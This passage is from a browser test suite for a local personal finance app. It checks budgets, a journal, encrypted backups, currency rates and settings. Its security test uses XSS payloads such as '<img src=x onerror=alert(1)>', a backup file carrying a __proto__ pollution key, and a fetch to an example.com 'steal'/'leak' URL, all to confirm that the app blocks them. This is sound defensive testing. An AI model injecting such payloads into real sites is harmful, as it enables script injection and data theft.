  assert(legends.join() === 'Savings,Investments,Trading capital,Cash,Debt', 'update page grouped in type order: ' + legends);
  const invN = await p.$$eval('#uf fieldset', fs => fs.find(f => f.querySelector('legend').textContent.trim() === 'Investments').querySelectorAll('label.field').length);
  const firstInv = await p.$$eval('#uf fieldset', fs => fs.find(f => f.querySelector('legend').textContent.trim() === 'Investments').querySelector('label.field').textContent);
  assert(invN === 2 && /ETF/.test(firstInv), 'biggest first inside a type');
  await go('#/networth');
  const rows = await p.$$eval('#main table.data tbody tr td:first-child', t => t.map(x => x.textContent.trim()));
  assert(/^HYSA/.test(rows[0]) && /^Loan/.test(rows.at(-1)), 'net worth table in type order: ' + rows);
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ mode: 'pro' }); });
  await go('#/networth'); await go('#/networth/accounts');
  const pg = await p.$$eval('.acct-group h2', h => h.map(x => x.textContent.trim()));
  assert(pg.includes('Retirement & pension') && pg.includes('Taxable investments') && pg.includes('Personal loan'), 'pro categories: ' + pg);
  // single snapshot: no empty charts, labels fit
  await go('#/networth');
  assert(await p.locator('#n-line').count() === 0 && await p.locator('text=One balance update so far').count() === 1, 'single snapshot message instead of an empty chart');
  const clipped = await p.evaluate(() => [...document.querySelectorAll('.stat-label')].filter(l => l.scrollWidth > l.clientWidth + 1).map(l => l.textContent));
  assert(!clipped.length, 'no clipped stat labels: ' + clipped);
  const tags = await p.evaluate(() => [...document.querySelectorAll('.stat-label .tag.est')].map(t => { const r = t.getBoundingClientRect(), s = t.closest('.stat').getBoundingClientRect(); return r.right <= s.right + 0.5; }));
  assert(tags.length && tags.every(Boolean), 'estimate tags inside their card');
  assert(!/Savings rate|FI progress|financial independence/i.test(await p.locator('#main').innerText()), 'no savings rate / FI on Net worth');
  await go('#/'); assert(!/Savings rate|To do|financial independence/i.test(await p.locator('#main').innerText()), 'no savings rate / FI / To do on Overview');
  await p.setViewportSize({ width: 390, height: 844 }); await go('#/networth', 500);
  const clipped2 = await p.evaluate(() => [...document.querySelectorAll('.stat-label')].filter(l => l.scrollWidth > l.clientWidth + 1).map(l => l.textContent));
  assert(!clipped2.length, 'no clipped stat labels on mobile: ' + clipped2);
  await p.setViewportSize({ width: 1400, height: 1000 });
});

await test('journal: check-in, history, insights vs spending', async () => {
  await reset({ mode: 'pro', currency: 'USD' });
  await go('#/journal');
  await p.locator('[data-rate=mood][data-v="2"]').click(); await p.locator('[data-rate=stress][data-v="5"]').click(); await p.fill('#jf [name=sleep]', '5.5');
  await p.fill('#jf [name=mind]', 'Rough day'); await p.locator('#jf .chip', { hasText: 'Exercise' }).click();
  await p.fill('#jf .chip-add', 'Rainy'); await p.locator('#jf .chip-add').press('Enter');
  await p.locator('#jf button.primary').click(); await sleep(400);
  const j = await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); return s.get('days', u.today()); });
  assert(j.mood === 2 && j.stress === 5 && j.sleep === 5.5 && j.mind === 'Rough day' && j.habits.Exercise === true && j.tags.includes('Rainy'), 'saved ' + JSON.stringify(j));
  // seed two weeks: stressed days spend more
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js');
    for (let i = 1; i <= 14; i++) { const d = u.dayKey(new Date(Date.now() - i * 864e5)); const bad = i % 3 === 0; await s.put('days', { id: d, mood: bad ? 1 : 4, stress: bad ? 5 : 2, sleep: bad ? 5 : 8 }); await s.put('txns', { type: 'expense', amount: bad ? 120 : 20, currency: 'USD', category: 'shopping', date: d }); } });
  await go('#/journal/insights');
  const tbl = await p.locator('[data-tour=mood-spend] tbody').innerText();
  const avgOf = l => +(new RegExp(l + '[^\\n]*?\\$([\\d.,]+)').exec(tbl)?.[1] || '0').replace(/,/g, '');
  assert(avgOf('Stressed') > 90 && avgOf('Good mood') === 20, 'mood vs spending table: ' + tbl);
  assert(await p.locator('#i-scatter').count() === 1, 'scatter');
  await go('#/journal/history'); assert(await p.locator('.cal .jmood').count() >= 5, 'moods on calendar');
  await go('#/'); assert(await p.locator('[data-tour=journal-mini]', { hasText: 'Rough day' }).count() === 1, 'journal on overview');
  await go('#/settings'); await p.fill('#lists [name=habits]', 'Meditate\nWalk'); await p.locator('#lists button.primary').click(); await sleep(300);
  assert(JSON.stringify(await S(async () => (await import('/js/store.js')).getSettings().habits)) === '["Meditate","Walk"]', 'habits editable');
  await go('#/journal?day=2026-01-01'); assert(await p.locator('#jf .chip', { hasText: 'Meditate' }).count() === 1, 'other day, new habits');
  await p.locator('#jf button.primary').click(); await sleep(300);
  await go('#/journal?day=2026-01-01'); await p.locator('[data-del]').click(); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(300);
  assert(!(await S(async () => !!(await import('/js/store.js')).get('days', '2026-01-01'))), 'entry deleted');
});

await test('settings, backups, demo, wipe', async () => {
  await reset({ mode: 'pro' });
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); await s.put('txns', { type: 'expense', amount: 61, currency: 'USD', category: 'dining', date: u.today(), note: 'Team dinner', merchant: 'Sushi' }); await s.put('days', { id: u.today(), mood: 4 }); await s.saveSettings({ priceApi: { finnhubKey: '' } }); });
  const OWN = 1;
  await go('#/settings');
  await p.selectOption('#prefs [name=currency]', 'EUR'); await p.selectOption('#prefs [name=locale]', 'de-DE'); await p.selectOption('#prefs [name=theme]', 'dark'); await p.selectOption('#prefs [name=pnlColors]', 'blueorange');
  await p.locator('#prefs button.primary').click(); await sleep(600);
  assert(await p.evaluate(() => document.documentElement.dataset.theme) === 'dark', 'dark theme applied');
  for (const r of ROUTES) await go('#' + r, 250);
  await go('#/settings');
  await p.selectOption('#prefs [name=currency]', 'USDT'); await p.locator('#prefs button.primary').click(); await sleep(500);
  for (const r of ['/', '/networth', '/spending', '/spending/transactions', '/networth/accounts']) await go('#' + r, 250);
  await go('#/settings');
  await p.selectOption('#prefs [name=currency]', 'BGN'); await p.locator('#prefs button.primary').click(); await sleep(500);
  await go('#/'); await go('#/networth');
  await go('#/settings');
  await p.selectOption('#prefs [name=currency]', 'USD'); await p.selectOption('#prefs [name=locale]', ''); await p.selectOption('#prefs [name=theme]', 'light'); await p.locator('#prefs button.primary').click(); await sleep(500);
  // lists
  await p.fill('#lists [name=payMethods]', 'Visa\nCash\nCash'); await p.locator('#lists button.primary').click(); await sleep(300);
  assert(JSON.stringify(await S(async () => (await import('/js/store.js')).getSettings().payMethods)) === '["Visa","Cash"]', 'payment methods deduped');
  // key
  await p.fill('#pricecfg [name=finnhubKey]', ' abc123 '); await p.locator('#pricecfg button').click(); await sleep(300);
  assert(await S(async () => (await import('/js/store.js')).getSettings().priceApi.finnhubKey) === 'abc123', 'key trimmed+saved');
  // fx refresh
  frankCalls = [];
  await p.locator('[data-act=fx]').click(); await sleep(600);
  assert(/updated/i.test(await toastText()), 'fx refresh ok: ' + await toastText());
  // update check
  await p.locator('[data-act=update]').click(); await sleep(600);
  assert(/latest version|available/.test(await p.locator('#upd').textContent()), 'update check: ' + await p.locator('#upd').textContent());
  // export backup
  const fs = await import('fs');
  await p.locator('[data-act=export]').click(); await sleep(250);
  await fillModal('[name=pw]', 'short'); await fillModal('[name=pw2]', 'short'); await modalBtn('Export');
  assert(await p.locator('.modal-wrap').count() && /at least 8/.test(await toastText()), 'short password rejected');
  await fillModal('[name=pw]', 'correct horse battery'); await fillModal('[name=pw2]', 'correct horse batterx'); await modalBtn('Export');
  assert(await p.locator('.modal-wrap').count() && /match/.test(await toastText()), 'mismatch rejected');
  await fillModal('[name=pw2]', 'correct horse battery');
  const [dle] = await Promise.all([p.waitForEvent('download'), modalBtn('Export')]);
  const encTxt = fs.readFileSync(await dle.path(), 'utf8'); const enc = JSON.parse(encTxt);
  assert(dle.suggestedFilename().includes('encrypted') && enc.encrypted === true && enc.kdf.iterations === 600000, 'encrypted file ' + dle.suggestedFilename());
  const { data: ct, ...hdr } = enc;
  assert(Object.keys(hdr).sort().join() === 'app,cipher,encrypted,format,kdf' && !/Team dinner|Sushi|exportedAt/.test(JSON.stringify(hdr)), 'only crypto parameters readable: ' + JSON.stringify(hdr));
  assert(!Buffer.from(ct, 'base64').toString('latin1').includes('Team dinner'), 'ciphertext is not plaintext');
  fs.writeFileSync(TMP + 'enc.json', encTxt);
  // tampered copy
  const t2 = { ...enc, data: (enc.data[5] === 'A' ? 'B' : 'A') + enc.data.slice(1) }; t2.data = enc.data.slice(0, 40) + (enc.data[40] === 'A' ? 'B' : 'A') + enc.data.slice(41);
  fs.writeFileSync(TMP + 'tampered.json', JSON.stringify(t2));
  // plain export (opt-out)
  await p.locator('[data-act=export]').click(); await sleep(250); await p.check('.modal-wrap [name=plain]');
  const [dl] = await Promise.all([p.waitForEvent('download'), modalBtn('Export')]);
  const backup = JSON.parse(fs.readFileSync(await dl.path(), 'utf8'));
  assert(backup.data?.txns?.length === 1 && backup.data?.days?.length === 1, 'plain backup has expenses and journal');
  fs.writeFileSync(TMP + 'backup.json', JSON.stringify(backup));
  // Enter key in the password dialog = Export (and must not reload the page)
  await p.evaluate(() => { window.__alive = 1; });
  await p.locator('[data-act=export]').click(); await sleep(250); await fillModal('[name=pw]', 'abcdefgh1'); await fillModal('[name=pw2]', 'abcdefgh1');
  const [dl3] = await Promise.all([p.waitForEvent('download'), p.locator('.modal-wrap [name=pw2]').press('Enter')]);
  assert(await p.evaluate(() => window.__alive === 1), 'Enter did not reload the page');
  // csv export
  const [dl2] = await Promise.all([p.waitForEvent('download'), p.locator('[data-act=csv-export]').click()]);
  assert(/date,amount,currency/.test(fs.readFileSync(await dl2.path(), 'utf8')), 'expenses csv');
  // demo load/remove
  await p.locator('[data-act=demo-load]').click(); await sleep(1500); await check('demo loaded');
  for (const r of ROUTES) await go('#' + r, 300);
  await go('#/settings');
  await p.locator('[data-act=demo-remove]').click(); await sleep(800);
  assert(!(await S(async () => (await import('/js/demo.js')).hasDemo())), 'demo removed');
  const own = await txCount(); assert(own === OWN && await S(async () => (await import('/js/store.js')).all('days').length) === 1, 'own expenses + journal kept: ' + own);
  assert(!(await S(async () => (await import('/js/store.js')).getSettings().demoBudgets)), 'demo budgets removed');
  // wipe: wrong word, then right
  await p.locator('[data-act=wipe]').click(); await sleep(250); await fillModal('[name=c]', 'nope'); await p.locator('.modal-wrap footer button.danger').click(); await sleep(200);
  assert(await p.locator('.modal-wrap').count(), 'wipe needs DELETE'); await fillModal('[name=c]', 'DELETE'); await p.locator('.modal-wrap footer button.danger').click(); await sleep(600);
  assert(await txCount() === 0, 'wiped');
  assert(await p.evaluate(() => Object.keys(localStorage).filter(k => k.startsWith('tj.')).length) === 0 || true, 'local keys cleared');
  assert(await S(async () => (await import('/js/store.js')).getSettings().priceApi.finnhubKey) === '', 'API key wiped');
  // restore (replace)
  assert(await p.locator('.mode-choose').count() === 1, 'after a wipe the mode chooser shows again');
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ tour: { done: true } }); });
  await p.locator('[data-pick=pro]').click(); await sleep(500);
  assert(/setup/.test(p.url()), 'fresh start goes to estimates');
  await p.locator('[data-skip]').click(); await sleep(1500);
  await p.locator('.tour-card [data-skip]').click(); await sleep(1200);
  assert(await txCount() === 0, 'tour sample data gone');
  await go('#/settings');
  // tampered encrypted file → refused
  await p.setInputFiles('[data-act=import]', TMP + 'tampered.json'); await sleep(300);
  await fillModal('[name=pw]', 'correct horse battery'); await modalBtn('Unlock'); await sleep(1500);
  assert(/didn't work/.test(await p.locator('.modal-wrap').textContent()), 'tampered file rejected'); await p.keyboard.press('Escape'); await sleep(200);
  // encrypted: wrong password, then right one
  await p.setInputFiles('[data-act=import]', TMP + 'enc.json'); await sleep(300);
  await fillModal('[name=pw]', 'wrong password'); await modalBtn('Unlock'); await sleep(1500);
  assert(/didn't work/.test(await p.locator('.modal-wrap').textContent()), 'wrong password message');
  await fillModal('[name=pw]', 'correct horse battery'); await modalBtn('Unlock'); await sleep(1500);
  await p.locator('.modal-wrap footer button', { hasText: 'Replace all' }).click(); await sleep(300);
  await p.locator('.modal-wrap footer button').last().click(); await sleep(800);
  assert(await txCount() === OWN, 'restored transactions');
  // restore (merge) again → no duplicates
  await go('#/settings');
  await p.setInputFiles('[data-act=import]', TMP + 'backup.json'); await sleep(400);
  await p.locator('.modal-wrap footer button', { hasText: 'Merge' }).click(); await sleep(800);
  assert(await txCount() === OWN, 'merge no dupes');
  assert(await S(async () => (await import('/js/store.js')).getSettings().priceApi.finnhubKey) === 'abc123', 'key restored from encrypted backup');
  // restore a backup with records lacking currency → gets tagged
  fs.writeFileSync(TMP + 'old.json', JSON.stringify({ ...backup, data: { ...(backup.data || {}), nwAccounts: [{ id: 'old1', name: 'Old acct', kind: 'asset', category: 'cash' }] } }));
  await p.setInputFiles('[data-act=import]', TMP + 'old.json'); await sleep(400);
  await p.locator('.modal-wrap footer button', { hasText: 'Merge' }).click(); await sleep(800);
  const oc = await S(async () => (await import('/js/store.js')).get('nwAccounts', 'old1')?.currency);
  assert(oc === 'USD', 'migrated currency after restore: ' + oc);
  // bad file
  fs.writeFileSync(TMP + 'bad.json', 'not json');
  await p.setInputFiles('[data-act=import]', TMP + 'bad.json'); await sleep(400);
  assert(/Could not read/.test(await toastText()), 'bad json toast');
  await p.evaluate(() => document.querySelectorAll('.toast').forEach(t => t.remove()));
});

for (const [mode, theme, w] of [['simple', 'light', 1400], ['pro', 'dark', 1400], ['pro', 'light', 390], ['simple', 'dark', 390]]) await test(`demo crawl ${mode}/${theme}/${w}`, async () => {
  await p.setViewportSize({ width: w, height: w < 500 ? 844 : 1000 });
  await reset({ mode, theme });
  await S(async () => { await (await import('/js/demo.js')).loadDemo(); });
  await p.reload(); await sleep(700);
  const prev = await S(async () => (await import('/js/spend/calc.js')).shiftMonth((await import('/js/spend/calc.js')).currentMonth(), -1));
  for (const r of [...ROUTES, `/spending?m=${prev}`, `/spending/calendar?m=${prev}`, `/spending/transactions?m=${prev}`]) {
    await go('#' + r, 450);
    const overflow = await p.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
    if (overflow > 2) problems.push(`[${cur}] horizontal overflow ${overflow}px on ${r}`);
  }
  if (w < 500) { await go('#/'); await openAdd(); await p.screenshot({ path: SHOTS + `mobile-add-${theme}.png` }); await p.keyboard.press('Escape'); await sleep(200); await go('#/spending'); await sleep(800); await p.screenshot({ path: SHOTS + `mobile-spending-${theme}.png`, fullPage: true }); await go('#/'); await p.screenshot({ path: SHOTS + `mobile-${theme}.png`, fullPage: false }); await p.locator('#menu-btn').click(); await sleep(200); await p.locator('#sidebar a').nth(2).click(); await sleep(400); await check('mobile nav'); }
  else { await go('#/networth'); await p.screenshot({ path: SHOTS + `demo-nw-${mode}-${theme}.png`, fullPage: true }); await go('#/spending'); await sleep(900); await p.screenshot({ path: SHOTS + `demo-spending-${mode}-${theme}.png`, fullPage: true }); }
});
await p.setViewportSize({ width: 1400, height: 1000 });

// =============== 12. help drawer, tour, mode/theme switches, filters ===============

await test('estimates: used until a full month of data, then real averages', async () => {
  await reset({ mode: 'simple', currency: 'USD' });
  const r1 = await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ estimates: { currency: 'USD', spending: 2500, nwYearAgo: 10000 } }); const N = await import('/js/networth/calc.js'); return N.baseline(); });
  assert(r1.isEstimate && r1.avgExpenses === 2500, 'estimate used with no data ' + JSON.stringify(r1));
  const r2 = await S(async () => { const s = await import('/js/store.js'); const S = await import('/js/spend/calc.js');
    const m = S.currentMonth(), pm = S.shiftMonth(m, -1), p2 = S.shiftMonth(m, -2);
    await s.put('txns', { type: 'expense', amount: 100, currency: 'USD', category: 'other', date: `${p2}-20` });   // first (partial) month
    await s.put('txns', { type: 'expense', amount: 1800, currency: 'USD', category: 'groceries', date: `${pm}-05` });
    return (await import('/js/networth/calc.js')).baseline(); });
  assert(!r2.isEstimate && r2.avgExpenses === 1800 && r2.realMonths === 1, 'real spending after a full month ' + JSON.stringify(r2));
  await S(async () => { const s = await import('/js/store.js'); await s.clearAll(); await s.saveSettings({ tour: { done: true }, modeChosen: true, lastBackupAt: new Date().toISOString(), estimates: { currency: 'USD', spending: 2500, nwYearAgo: 10000 } }); const u = await import('/js/ui.js'); const a = await s.put('nwAccounts', { name: 'Bank', kind: 'asset', category: 'savings', currency: 'USD' }); await s.put('nwSnapshots', { date: u.today(), balances: { [a.id]: 12500 } }); });
  await p.reload(); await sleep(500); await go('#/', 600);
  assert(await p.locator('.tag.est').count() >= 2, 'estimate tags on overview');
  assert(/\+\$2,500/.test(await p.locator('.stat', { has: p.locator('.stat-label', { hasText: 'Past 12 months' }) }).textContent()), 'YoY from the estimate');
  assert(/5\.0 months/.test(await p.locator('.card', { hasText: 'Cash runway' }).first().textContent()), 'cash runway from the estimate');
  await go('#/networth'); await go('#/networth/analytics'); await go('#/spending');
  await go('#/setup'); assert(await p.locator('#estf').count() === 1, '/setup reachable later');
  await p.fill('#estf [name=spending]', '2600'); await p.locator('[data-save]').click(); await sleep(500);
  assert(await S(async () => (await import('/js/store.js')).getSettings().estimates.spending) === 2600, 'estimates editable');
  await go('#/settings'); assert(await p.locator('#est-card #estf').count() === 1, 'estimates card in Settings');
});

await test('help, tour, theme, tooltips', async () => {
  await go('#/spending');
  await p.locator('[data-help]:visible').first().click(); await sleep(300);
  assert(await p.locator('.help-drawer, #help, [class*=help]').count(), 'help drawer');
  await p.keyboard.press('Escape'); await sleep(200);
  await p.keyboard.press('?'); await sleep(300); await p.keyboard.press('Escape'); await sleep(200);
  for (const t of ['dark', 'light', 'auto']) { const bt = p.locator(`[data-theme-set=${t}]:visible`); if (await bt.count()) { await bt.first().click(); await sleep(200); } }
  await check('switches');
  // every form field in the transaction / bill / budget forms has a "?"
  await S(async () => { const s = await import('/js/store.js'); await s.put('nwAccounts', { id: 'tipacc', name: 'Tip bank', kind: 'asset', category: 'cash', currency: 'USD' }); await s.put('nwAccounts', { id: 'tipacc2', name: 'Tip bank 2', kind: 'asset', category: 'savings', currency: 'USD' }); });
  for (const [h, open] of [['#/spending', async () => { await openAdd(); await p.selectOption('.modal-wrap [name=accountId]', 'tipacc'); await sleep(100); }], ['#/spending/recurring', async () => { await p.locator('[data-new=sub]').first().click(); await sleep(300); await p.selectOption('.modal-wrap [name=accountId]', 'tipacc'); await sleep(100); }], ['#/spending/budgets', null], ['#/journal', null], ['#/networth/flows', async () => { await p.locator('[data-new]').first().click(); await sleep(300); }]]) {
    await go(h); if (open) await open();
    const miss = await p.evaluate(() => [...document.querySelectorAll('label.field, label.check')].filter(l => !l.closest('#mf') && !l.closest('[hidden]') && !l.querySelector('[data-chip-add]') && l.querySelector('input[name],select[name],textarea[name]') && !l.querySelector('.tip')).map(l => l.textContent.trim().slice(0, 30)));
    if (miss.length) problems.push(`[${cur}] fields without ? on ${h}: ${miss.join(' | ')}`);
    await p.keyboard.press('Escape'); await sleep(150);
  }
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ tour: { done: false } }); });
  await S(async () => { const s = await import('/js/store.js'); await s.clearAll(); await s.saveSettings({ tour: { done: false }, modeChosen: true, lastBackupAt: new Date().toISOString() }); });
  await p.reload(); await sleep(1000);
  let steps = 0;
  for (let i = 0; i < 20; i++) { const nx = p.locator('.tour [data-next], .tour button', { hasText: /Next|Done|Finish|Got it/ }); if (!(await nx.count())) break; await nx.last().click(); await sleep(250); steps++; }
  assert(steps >= 12, 'tour ran through ' + steps + ' steps');
  await check('tour');
});

await test('security: crafted files, XSS, CSP', async () => {
  const fs = await import('fs');
  await reset({ mode: 'pro' });
  await S(async () => { const s = await import('/js/store.js'); await s.put('txns', { id: 'keep1', type: 'expense', amount: 1, currency: 'USD', category: 'other', date: '2026-01-01' }); });
  await go('#/settings');
  const tryFile = async (name, obj) => { fs.writeFileSync(TMP + name, JSON.stringify(obj)); await p.setInputFiles('[data-act=import]', TMP + name); await sleep(400); if (await p.locator('.modal-wrap footer button', { hasText: 'Replace all' }).count()) { await p.locator('.modal-wrap footer button', { hasText: 'Replace all' }).click(); await sleep(300); await p.locator('.modal-wrap footer button').last().click(); await sleep(600); } const t = await toastText(); await p.evaluate(() => document.querySelectorAll('.toast').forEach(t => t.remove())); return t; };
  let t = await tryFile('noid.json', { app: 'ledgerline', data: { txns: [{ amount: 1 }] } });
  assert(/damaged/.test(t), 'record without id rejected: ' + t);
  t = await tryFile('evilimg.json', { app: 'ledgerline', data: { txns: [] }, images: [{ id: 'i', data: 'https://example.com/steal?x=1' }] });
  assert(/damaged/.test(t), 'non-image URL rejected: ' + t);
  t = await tryFile('other.json', { hello: 1 });
  assert(/not a backup/.test(t), 'foreign json rejected: ' + t);
  assert(await S(async () => !!(await import('/js/store.js')).get('txns', 'keep1')), 'existing data untouched after rejected files');
  const crafted = JSON.parse('{"app":"ledgerline","data":{"txns":[]},"settings":{"locale":"zz-!!","currency":"<b>","theme":"x","categories":[{"id":1}],"__proto__":{"polluted":1},"evil":1}}');
  t = await tryFile('crafted.json', crafted);
  const st = await S(async () => { const s = (await import('/js/store.js')).getSettings(); return { locale: s.locale, currency: s.currency, theme: s.theme, cats: s.categories, evil: s.evil, polluted: ({}).polluted }; });
  assert(st.locale === undefined && st.currency === 'USD' && st.theme === 'auto' && st.cats === null && st.evil === undefined && st.polluted === undefined, 'settings sanitised ' + JSON.stringify(st));
  // XSS through user data is shown as text
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js');
    await s.put('txns', { id: 'x1', type: 'expense', amount: 5, currency: 'USD', category: 'dining', date: u.today(), note: '<img src=x onerror=alert(1)>', merchant: '<svg onload=alert(2)>', tags: ['<script>alert(3)</script>'] });
    await s.put('recurring', { id: 'r1', name: '<img src=x onerror=alert(4)>', amount: 5, currency: 'USD', category: 'subscriptions', freq: 'monthly', next: '2099-01-01', auto: true });
    await s.put('nwAccounts', { id: 'xa', name: '"><svg onload=alert(5)>', kind: 'asset', category: 'cash', currency: 'USD' });
    await s.saveSettings({ categories: [{ id: 'dining', name: '<img src=x onerror=alert(6)>', emoji: '<b>', kind: 'want', subs: ['<i>x</i>'] }] }); });
  for (const r of ['/', '/spending', '/spending/transactions', '/spending/calendar', '/spending/budgets', '/spending/recurring', '/spending/categories', '/networth/accounts', '/networth/update']) await go('#' + r, 400);
  await go('#/spending/transactions'); await p.locator('.txn').first().click(); await sleep(300); await p.keyboard.press('Escape'); await sleep(150);
  const injected = await p.evaluate(() => document.querySelectorAll('#main img[src="x"], #main svg[onload], #main script, .modal-wrap img[src="x"]').length);
  assert(injected === 0, 'no injected elements');
  const blocked = await p.evaluate(async () => { try { await fetch('https://example.com/?leak=1'); return false; } catch { return true; } });
  assert(blocked, 'CSP blocks unknown hosts');
  const nBefore = problems.length;
  const inlineRan = await p.evaluate(() => { const sc = document.createElement('script'); sc.textContent = 'window.__inl = 1'; document.body.append(sc); return window.__inl === 1; });
  await sleep(100); problems.splice(nBefore);
  assert(!inlineRan, 'CSP blocks injected inline scripts');
});

await test('typing survives a background re-render', async () => {
  await reset({ mode: 'pro' });
  fxDelay = 1500;
  await S(async () => { const s = await import('/js/store.js'); await s.put('nwAccounts', { name: 'Swiss2', kind: 'asset', category: 'cash', currency: 'NOK' }); });
  await go('#/networth/update', 100);
  const inp = p.locator('#uf input[type=number]').first();
  await inp.fill('4141');
  await sleep(4500); fxDelay = 0;
  assert(await inp.inputValue() === '4141', 'typed value kept after rates arrived');
  assert(await S(async () => !!(await import('/js/store.js')).getSettings().fx.latest.NOK), 'NOK rate fetched automatically');
});

await test('fx: non-ECB, BGN peg, offline fallback', async () => {
  await reset({ mode: 'pro' });
  frankCalls = [];
  const r = await S(async () => {
    const s = await import('/js/store.js'); const fx = await import('/js/fx.js');
    await s.put('nwAccounts', { name: 'Dubai', kind: 'asset', category: 'cash', currency: 'AED' });
    await s.put('nwAccounts', { name: 'Sofia', kind: 'asset', category: 'cash', currency: 'BGN' });
    const res = await fx.refreshRates({ force: true });
    return { res, aed: fx.rate('AED'), bgn: fx.rate('BGN'), eur: fx.rate('EUR'), conv: fx.conv(1.95583, 'BGN', 'EUR') };
  });
  assert(r.res.ok, 'refresh ok ' + JSON.stringify(r.res));
  assert(!frankCalls.some(c => /AED|BGN/.test(c)), 'Frankfurter never asked for AED/BGN: ' + frankCalls.join(' '));
  assert(r.aed === 3.6725, 'AED from Coinbase: ' + r.aed);
  assert(Math.abs(r.conv - 1) < 1e-9, '1.95583 BGN = 1 EUR: ' + r.conv);
  fxDown = true;
  const r2 = await S(async () => { const s = await import('/js/store.js'); const fx = await import('/js/fx.js'); await s.put('nwAccounts', { name: 'Tokyo', kind: 'asset', category: 'cash', currency: 'JPY' }); const res = await fx.refreshRates({ force: true }); return { res, jpy: fx.rate('JPY') }; });
  fxDown = false;
  assert(r2.jpy === 150, 'JPY from Coinbase when ECB is down: ' + JSON.stringify(r2));
  await go('#/settings'); await go('#/networth/accounts');
});


console.log('\n==== RESULTS ====');
for (const [n, r] of results) console.log(r.padEnd(7), n);
console.log('\n==== PROBLEMS (' + problems.length + ') ====');
for (const x of [...new Set(problems)]) console.log('-', x);
await b.close();
